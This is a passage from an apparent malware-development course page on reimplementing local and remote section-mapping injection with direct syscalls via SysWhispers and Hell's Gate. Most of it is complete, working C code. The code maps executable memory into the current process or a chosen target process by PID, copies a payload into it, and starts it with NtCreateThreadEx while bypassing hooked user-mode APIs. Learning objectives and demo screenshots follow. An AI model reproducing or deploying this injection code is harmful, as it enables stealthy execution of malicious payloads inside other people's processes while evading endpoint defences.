<pre><code>BOOL LocalMappingInjectionViaSyscalls(IN PVX_TABLE pVxTable, IN PVOID pPayload, IN SIZE_T sPayloadSize) {

	HANDLE				hSection		= NULL;
	HANDLE				hThread			= NULL;
	PVOID				pAddress		= NULL;
	NTSTATUS			STATUS			= NULL;
	SIZE_T				sViewSize		= NULL;
	LARGE_INTEGER		MaximumSize 	= {
			.HighPart = 0,
			.LowPart = sPayloadSize
	};

//--------------------------------------------------------------------------	
	// Allocating local map view 
	HellsGate(pVxTable-&gt;NtCreateSection.wSystemCall);
	if ((STATUS = HellDescent(&amp;hSection, SECTION_ALL_ACCESS, NULL, &amp;MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
		printf("[!] NtCreateSection Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}
	
	HellsGate(pVxTable-&gt;NtMapViewOfSection.wSystemCall);
	if ((STATUS = HellDescent(hSection, (HANDLE)-1, &amp;pAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
		printf("[!] NtMapViewOfSection Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}
	printf("[+] Allocated Address At : 0x%p Of Size : %ld \n", pAddress, sViewSize);

//--------------------------------------------------------------------------	
	// Writing the payload

	printf("[#] Press &lt;Enter&gt; To Write The Payload ... ");
	getchar();
	memcpy(pAddress, pPayload, sPayloadSize);
	printf("\t[+] Payload is Copied From 0x%p To 0x%p \n", pPayload, pAddress);
	printf("[#] Press &lt;Enter&gt; To Run The Payload ... ");
	getchar();

//--------------------------------------------------------------------------	
	
	// Executing the payload via thread creation

	printf("\t[i] Running Thread Of Entry 0x%p ... ", pAddress);
	HellsGate(pVxTable-&gt;NtCreateThreadEx.wSystemCall);
	if ((STATUS = HellDescent(&amp;hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, pAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
		printf("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}
	printf("[+] DONE \n");
	printf("\t[+] Thread Created With Id : %d \n", GetThreadId(hThread));

	
//--------------------------------------------------------------------------
	
	// Unmapping the local view - only when the payload is done executing
	HellsGate(pVxTable-&gt;NtUnmapViewOfSection.wSystemCall);
	if ((STATUS = HellDescent((HANDLE)-1, pAddress)) != 0) {
		printf("[!] NtUnmapViewOfSection Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}
	
	// Closing the section handle
	HellsGate(pVxTable-&gt;NtClose.wSystemCall);
	if ((STATUS = HellDescent(hSection)) != 0) {
		printf("[!] NtClose Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	return TRUE;
}

</code></pre>
<h4>RemoteMappingInjectionViaSyscalls</h4>
<pre><code>BOOL RemoteMappingInjectionViaSyscalls(IN PVX_TABLE pVxTable, IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize) {

	HANDLE				hSection			= NULL;
	HANDLE				hThread				= NULL;
	PVOID				pLocalAddress		= NULL,
					    pRemoteAddress		= NULL;
	NTSTATUS			STATUS				= NULL;
	SIZE_T				sViewSize			= NULL;
	LARGE_INTEGER		MaximumSize 	    = {
			.HighPart = 0,
			.LowPart = sPayloadSize
	};

//--------------------------------------------------------------------------
	// Allocating local map view 
	
	HellsGate(pVxTable-&gt;NtCreateSection.wSystemCall);
	if ((STATUS = HellDescent(&amp;hSection, SECTION_ALL_ACCESS, NULL, &amp;MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
		printf("[!] NtCreateSection Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	HellsGate(pVxTable-&gt;NtMapViewOfSection.wSystemCall);
	if ((STATUS = HellDescent(hSection, (HANDLE)-1, &amp;pLocalAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, PAGE_READWRITE)) != 0) {
		printf("[!] NtMapViewOfSection [L] Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	printf("[+] Local Memory Allocated At : 0x%p Of Size : %d \n", pLocalAddress, sViewSize);

//--------------------------------------------------------------------------

	// Writing the payload
	printf("[#] Press &lt;Enter&gt; To Write The Payload ... ");
	getchar();
	memcpy(pLocalAddress, pPayload, sPayloadSize);
	printf("\t[+] Payload is Copied From 0x%p To 0x%p \n", pPayload, pLocalAddress);

//--------------------------------------------------------------------------

	// Allocating remote map view 
	HellsGate(pVxTable-&gt;NtMapViewOfSection.wSystemCall);
	if ((STATUS = HellDescent(hSection, hProcess, &amp;pRemoteAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
		printf("[!] NtMapViewOfSection [R] Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	printf("[+] Remote Memory Allocated At : 0x%p Of Size : %d \n", pRemoteAddress, sViewSize);

//--------------------------------------------------------------------------

	// Executing the payload via thread creation
	printf("[#] Press &lt;Enter&gt; To Run The Payload ... ");
	getchar();
	printf("\t[i] Running Thread Of Entry 0x%p ... ", pRemoteAddress);
	HellsGate(pVxTable-&gt;NtCreateThreadEx.wSystemCall);
	if ((STATUS = HellDescent(&amp;hThread, THREAD_ALL_ACCESS, NULL, hProcess, pRemoteAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
		printf("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}
	printf("[+] DONE \n");
	printf("\t[+] Thread Created With Id : %d \n", GetThreadId(hThread));

//--------------------------------------------------------------------------

	// Unmapping the local view - only when the payload is done executing
	HellsGate(pVxTable-&gt;NtUnmapViewOfSection.wSystemCall);
	if ((STATUS = HellDescent((HANDLE)-1, pLocalAddress)) != 0) {
		printf("[!] NtUnmapViewOfSection Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	// Closing the section handle
	HellsGate(pVxTable-&gt;NtClose.wSystemCall);
	if ((STATUS = HellDescent(hSection)) != 0) {
		printf("[!] NtClose Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	return TRUE;
}
</code></pre>
<h3>Local vs Remote Injection</h3>
<p>Similar to the previous module, a preprocessor macro code was constructed to target the local process if <code>LOCAL_INJECTION</code> is defined. The preprocessor code is shown below.</p>
<pre><code>#define LOCAL_INJECTION

#ifndef LOCAL_INJECTION
#define REMOTE_INJECTION
// Set the target process PID
#define PROCESS_ID	18784	
#endif // !LOCAL_INJECTION
</code></pre>
<h3>Demo</h3>
<p>Using the SysWhispers implementation locally.</p>
<p><img src="Syscalls%20-%20Reimplementing%20Mapping%20Injection_files/syscall-mapping-214533288-cc53802f-345d-4eb3-896a-fb4d7dc61b.png" alt="image"></p>
<p>Using SysWhispers implementation remotely.</p>
<p><img src="Syscalls%20-%20Reimplementing%20Mapping%20Injection_files/syscall-mapping-314533763-efe02370-e08e-4d13-9c4c-884931855b.png" alt="image"></p>
<p>Using Hell's Gate implementation locally.</p>
<p><img src="Syscalls%20-%20Reimplementing%20Mapping%20Injection_files/syscall-mapping-414534077-da2c3b3e-fcac-4691-9e1e-261b6380e7.png" alt="image"></p>
<p>Using Hell's Gate implementation remotely.</p>
<p><img src="Syscalls%20-%20Reimplementing%20Mapping%20Injection_files/syscall-mapping-514534407-34d19c71-70d1-4669-99c0-6b3ce6a64d.png" alt="image"></p>

            </div></div>
            <div id="accessory-container" class="hidden flex flex-col w-1/4 min-w-1/4 h-full">
                <div id="objectives" class="hidden p-4 border-r border-b bg-gray-900 border-gray-600 font-code w-full h-1/2">
                    <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg">Objectives</div>
                                                                        
                                                                        
            <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-0" data-objective-id="0" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Implement mapping injection using SysWhispers and Hell's Gate</label>
                            </div>
                                                                        
                                                                        
                    <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-1" data-objective-id="1" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Alter the code to use NtWaitForSingleObject to wait for payload execution before unmapping</label>
                            </div>
                                                                        
                                                                        
                    <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-2" data-objective-id="2" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Understand the usage and parameters of the NtCreateSection, NtMapViewOfSection, NtClose, and NtUnmapViewOfSection syscalls</label>
                            </div>
                                                                                  
                </div>
                <div id="ide" class="hidden p-4 border-r border-b border-gray-600 font-code w-full h-1/2">
                    <textarea class="bg-gray-900 outline-0 w-full h-full resize-none font-sans" placeholder="Write temporary notes or code here"></textarea>
                </div>
            </div>  
        </div>
      </div>
      <div class="flex">
        <div class="flex flex-row flex-wrap justify-center items-center w-full bg-gray-700 border-r border-l border-gray-600 pl-4 pt-2 pb-2 rounded-bl rounded-br">
                        <div class="mr-2">
                <a data-target="_self" href="https://maldevacademy.com/modules/67"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Previous</button></a>           
            </div>
                        <div class="mr-2">
                <a data-target="_self" href="https://maldevacademy.com/modules"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Modules</button></a>           
            </div>
            <div class="my-2 mr-2">
            <form id="complete-module" action="https://maldevacademy.com/modules/68/complete" method="POST">
                <input type="hidden" name="_token" value="YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost">                <button id="complete-btn" class="w-[100px] h-10 px-5 text-white text-sm duration-150 bg-green-700 rounded-lg focus:shadow-outline hover:bg-green-800 ">Complete</button>
            </form>
            <form id="uncomplete-module" action="https://maldevacademy.com/modules/68/progress" method="POST">
                <input type="hidden" name="_token" value="YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost">                <button id="uncomplete-btn" class="w-[100px] h-10 px-5 text-white text-sm duration-150 bg-red-700 rounded-lg focus:shadow-outline hover:bg-red-800 hidden">Undo</button>
            </form>
            </div>
                                    <div class="mr-2">
                <a data-target="_self" href="https://maldevacademy.com/modules/69"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Next</button></a>           
            </div>
                    </div>
    </div>
</div>

<footer id="footer" class="text-gray-400 border-t-[1px] border-gray-700 bg-gray-900 body-font hidden">
    <div class="container px-5 py-8 mx-auto flex items-center sm:flex-row flex-col">
      <p class="text-sm text-gray-400 sm:ml-4 sm:pl-4 sm:border-gray-800 sm:py-2 sm:mt-0 mt-4">© 2023 MalDev Academy</p>
        <a href="https://twitter.com/maldevacademy" target="_blank" class="text-gray-500 hover:text-white ml-2">
            <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24" aria-hidden="true"><path d="M8.29 20.251c7.547 0 11.675-6.253 11.675-11.675 0-.178 0-.355-.012-.53A8.348 8.348 0 0022 5.92a8.19 8.19 0 01-2.357.646 4.118 4.118 0 001.804-2.27 8.224 8.224 0 01-2.605.996 4.107 4.107 0 00-6.993 3.743 11.65 11.65 0 01-8.457-4.287 4.106 4.106 0 001.27 5.477A4.072 4.072 0 012.8 9.713v.052a4.105 4.105 0 003.292 4.022 4.095 4.095 0 01-1.853.07 4.108 4.108 0 003.834 2.85A8.233 8.233 0 012 18.407a11.616 11.616 0 006.29 1.84"></path></svg>
        </a>
      <span class="inline-flex sm:ml-auto sm:mt-0 mt-4 justify-center sm:justify-start">
        <a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
          Terms and Conditions
      </a></span><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
    </a></div><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
  </a></footer><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">        

        <script src="Syscalls%20-%20Reimplementing%20Mapping%20Injection_files/jquery-3.6.0.min.js"></script>
        <script src="Syscalls%20-%20Reimplementing%20Mapping%20Injection_files/bootstrap.min.js"></script>
        <link rel="preload" as="style" href="Syscalls%20-%20Reimplementing%20Mapping%20Injection_files/app.4474f4d1.css"><link rel="modulepreload" href="Syscalls%20-%20Reimplementing%20Mapping%20Injection_files/app.5f3af5ce.js"><link rel="stylesheet" href="Syscalls%20-%20Reimplementing%20Mapping%20Injection_files/app.4474f4d1.css"><script type="module" src="Syscalls%20-%20Reimplementing%20Mapping%20Injection_files/app.5f3af5ce.js"></script><script src="Syscalls%20-%20Reimplementing%20Mapping%20Injection_files/navbar.js"></script>
<script src="Syscalls%20-%20Reimplementing%20Mapping%20Injection_files/moduleviewer.js"></script>

 
<script>
$(document).ready(function() {
    $('a:not([data-target="_self"])').attr('target', '_blank');

    $('input[type=checkbox]').change(function() {
    var checked = $(this).is(':checked');
    var userId = 260;
    var moduleId = 68;
    var objectiveId = $(this).data('objective-id');
    $.ajax({
        url: checked ? "https://maldevacademy.com/complete/objective" : "https://maldevacademy.com/remove/objective",
        type: "POST",
        data: {
        _token: "YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost",
        user_id: userId,
        module_id: moduleId,
        objective_id: objectiveId
        },
        success: function(response) {

        },
        error: function(xhr) {
        console.log('Error');
        }
    });
    });

    $('#complete-module').submit(function(event) {
    event.preventDefault(); // Prevent default form submission

    var form = $(this);
    var url = form.attr('action');
    var data = form.serialize();
    var completeBtn = form.find('#complete-btn');
    var uncompleteBtn = $('#uncomplete-btn');

    $.ajax({
        type: 'POST',
        url: url,
        data: data,
        success: function(response) {
            completeBtn.addClass('hidden');
            uncompleteBtn.removeClass('hidden');
        },
        error: function(xhr) {
            console.log('Error');
        }
    });
});

$('#uncomplete-module').submit(function(event) {
    event.preventDefault(); // Prevent default form submission

    var form = $(this);
    var url = form.attr('action');
    var data = form.serialize();
    var completeBtn = $('#complete-btn');
    var uncompleteBtn = form.find('#uncomplete-btn');

    $.ajax({
        type: 'POST',
        url: url,
        data: data,
        success: function(response) {
            uncompleteBtn.addClass('hidden');
            completeBtn.removeClass('hidden');
        },
        error: function(xhr) {
            console.log('Error');
        }
    });
});
});
</script>
    
</a></body></html>